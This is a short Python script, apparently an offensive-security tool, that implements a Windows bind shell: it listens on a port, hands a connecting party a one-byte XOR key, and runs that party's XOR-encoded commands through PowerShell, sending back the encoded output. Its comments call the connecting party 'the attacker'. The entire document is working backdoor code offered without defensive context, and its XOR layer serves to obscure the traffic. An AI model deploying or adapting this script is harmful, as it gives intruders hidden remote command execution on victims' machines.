#Bind Shell (Server) (XOR Algorithm) 
#Author Yehia Elghaly

import socket
import subprocess
import os

# XOR encryption & decryption function
def encrypt(data, xkey):
    encrypted_data = b""
    for i in range(len(data)):
        encrypted_data += bytes([ord(chr(data[i])) ^ ord(chr(xkey[i % len(xkey)]))])
    return encrypted_data


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("172.16.110.130", 443))
server_socket.listen(1)
client_socket, client_address = server_socket.accept()

# It a generate random key for XOR encryption
xkey = os.urandom(1)
# Send the key to the attacker
client_socket.send(xkey)

while True:
    process = subprocess.Popen("powershell.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    # It will receive the command and decrypt and execute it
    command = client_socket.recv(1024)
    command = encrypt(command, xkey).decode()
    output = process.communicate(command.encode())[0]

    # It sends the encrypted output to attacker
    output = encrypt(output, xkey)
    client_socket.send(output)

client_socket.close()
server_socket.close()